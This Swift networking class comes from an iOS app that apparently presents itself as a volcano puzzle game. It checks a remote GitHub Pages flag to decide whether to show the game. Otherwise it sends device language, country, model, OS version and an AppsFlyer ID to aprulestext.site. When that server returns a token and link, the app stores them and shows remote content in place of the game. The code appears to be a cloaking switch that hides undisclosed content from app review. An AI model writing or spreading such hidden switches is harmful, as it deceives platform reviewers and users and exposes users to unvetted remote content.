import Foundation
import UIKit
import AppsFlyerLib

final class NetworkService {
    static let shared = NetworkService()
    
    private init() {}
    
    private var deviceLanguage: String {
        let lang = Locale.preferredLanguages.first ?? "en"
        if let dashIndex = lang.firstIndex(of: "-") {
            return String(lang[..<dashIndex])
        }
        return lang
    }
    
    private var deviceCountry: String {
        return Locale.current.region?.identifier ?? "US"
    }
    
    private var deviceModel: String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        return identifier.lowercased().replacingOccurrences(of: ",", with: ".")
    }
    
    private var osVersion: String {
        return UIDevice.current.systemVersion
    }
    
    enum NetworkResult {
        case showGame
        case showContent(token: String, link: String)
        case showGameWithLabel(text: String, size: CGFloat)
    }
    
    func checkInitialRoute(completion: @escaping (NetworkResult) -> Void) {
        if StorageService.shared.hasStoredAuth(),
           let link = StorageService.shared.contentLink {
            completion(.showContent(token: StorageService.shared.authToken ?? "", link: link))
            return
        }
        
        checkPrimaryEndpoint(completion: completion)
    }
    
    private func checkPrimaryEndpoint(completion: @escaping (NetworkResult) -> Void) {
        let primaryPath = "https://tanveerfatima9.github.io/info-lavaflow-volcanopuzzle/"
        
        guard let endpoint = Foundation.URL(string: primaryPath) else {
            fetchDisplayData(completion: completion)
            return
        }
        
        var request = URLRequest(url: endpoint)
        request.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        request.timeoutInterval = 15
        
        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else {
                DispatchQueue.main.async { completion(.showGame) }
                return
            }
            
            if error != nil || data == nil {
                self.fetchDisplayData(completion: completion)
                return
            }
            
            guard let data = data,
                  let content = String(data: data, encoding: .utf8) else {
                self.fetchDisplayData(completion: completion)
                return
            }
            
            let lines = content.components(separatedBy: .newlines)
            if lines.count >= 2 {
                let secondLine = lines[1]
                if secondLine.contains("lang=\"en\"") {
                    DispatchQueue.main.async { completion(.showGame) }
                    return
                }
            }
            
            self.fetchDisplayData(completion: completion)
        }.resume()
    }
    
    private func fetchDisplayData(completion: @escaping (NetworkResult) -> Void) {
        let basePath = "https://aprulestext.site/ios-lavaflow-volcanopuzzle/count.php"
        let params = "p=Bs2675kDjkb5Ga&lng=\(deviceLanguage)&country=\(deviceCountry)"
        
        guard let endpoint = Foundation.URL(string: "\(basePath)?\(params)") else {
            fetchServerData(displayText: nil, displaySize: nil, completion: completion)
            return
        }
        
        var request = URLRequest(url: endpoint)
        request.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        request.timeoutInterval = 15
        
        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else {
                DispatchQueue.main.async { completion(.showGame) }
                return
            }
            
            var labelText: String? = nil
            var labelSize: CGFloat? = nil
            
            if error == nil, let data = data {
                let windows1251 = CFStringConvertEncodingToNSStringEncoding(CFStringEncoding(CFStringEncodings.windowsCyrillic.rawValue))
                var content: String? = String(data: data, encoding: String.Encoding(rawValue: windows1251))
                if content == nil {
                    content = String(data: data, encoding: .utf8)
                }
                if content == nil {
                    content = String(data: data, encoding: .isoLatin1)
                }
                
                if let responseText = content {
                    let cleanText = responseText.trimmingCharacters(in: .whitespacesAndNewlines)
                    if cleanText.contains("#") {
                        let parts = cleanText.components(separatedBy: "#")
                        if parts.count >= 2 {
                            let textPart = parts[0].trimmingCharacters(in: .whitespacesAndNewlines)
                            let sizePart = parts[1].trimmingCharacters(in: .whitespacesAndNewlines)
                            
                            if !textPart.isEmpty {
                                labelText = textPart
                            }
                            
                            let sizeString = sizePart.filter { $0.isNumber || $0 == "." }
                            if let sizeValue = Double(sizeString), sizeValue > 0 {
                                labelSize = CGFloat(sizeValue)
                            }
                        }
                    }
                }
            }
            
            self.fetchServerData(displayText: labelText, displaySize: labelSize, completion: completion)
        }.resume()
    }
    
    private func fetchServerData(displayText: String?, displaySize: CGFloat?, completion: @escaping (NetworkResult) -> Void) {
        let basePath = "https://aprulestext.site/ios-lavaflow-volcanopuzzle/server.php"
        let flyerId = AppsFlyerLib.shared().getAppsFlyerUID()
        let params = "p=Bs2675kDjkb5Ga&os=\(osVersion)&lng=\(deviceLanguage)&devicemodel=\(deviceModel)&country=\(deviceCountry)&appsid=\(flyerId)"
        
        guard let endpoint = Foundation.URL(string: "\(basePath)?\(params)") else {
            DispatchQueue.main.async {
                if let text = displayText, text.count >= 2, let size = displaySize {
                    completion(.showGameWithLabel(text: text, size: size))
                } else {
                    completion(.showGame)
                }
            }
            return
        }
        
        var request = URLRequest(url: endpoint)
        request.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        request.timeoutInterval = 15
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard error == nil,
                      let data = data,
                      let content = String(data: data, encoding: .utf8),
                      content.contains("#") else {
                    if let text = displayText, text.count >= 2, let size = displaySize {
                        completion(.showGameWithLabel(text: text, size: size))
                    } else {
                        completion(.showGame)
                    }
                    return
                }
                
                let parts = content.components(separatedBy: "#")
                if parts.count >= 2 {
                    let token = parts[0].trimmingCharacters(in: .whitespacesAndNewlines)
                    let link = parts[1].trimmingCharacters(in: .whitespacesAndNewlines)
                    
                    StorageService.shared.authToken = token
                    StorageService.shared.contentLink = link
                    
                    completion(.showContent(token: token, link: link))
                } else {
                    if let text = displayText, text.count >= 2, let size = displaySize {
                        completion(.showGameWithLabel(text: text, size: size))
                    } else {
                        completion(.showGame)
                    }
                }
            }
        }.resume()
    }
}

